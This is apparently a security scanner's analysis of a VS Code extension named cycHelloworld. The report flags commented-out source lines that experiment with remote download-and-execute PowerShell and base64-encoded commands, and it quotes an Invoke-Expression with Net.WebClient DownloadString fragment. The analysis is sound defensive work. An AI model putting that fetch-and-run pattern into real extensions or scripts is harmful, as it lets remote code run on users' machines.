Package: cycHelloworld (vsix)
Version: 0.1.0
Description: This is cycHelloworld

The extension executes a benign PowerShell command (`Get-PSProvider`) upon activation. However, the source code contains commented-out lines that demonstrate experimentation with highly suspicious and potentially malicious capabilities, including downloading and executing remote PowerShell scripts (`Invoke-Expression (New-Object Net.WebClient).DownloadString(...)`) and executing base64-encoded commands. This indicates a strong potential for future malicious updates or a testing phase for malicious functionality.
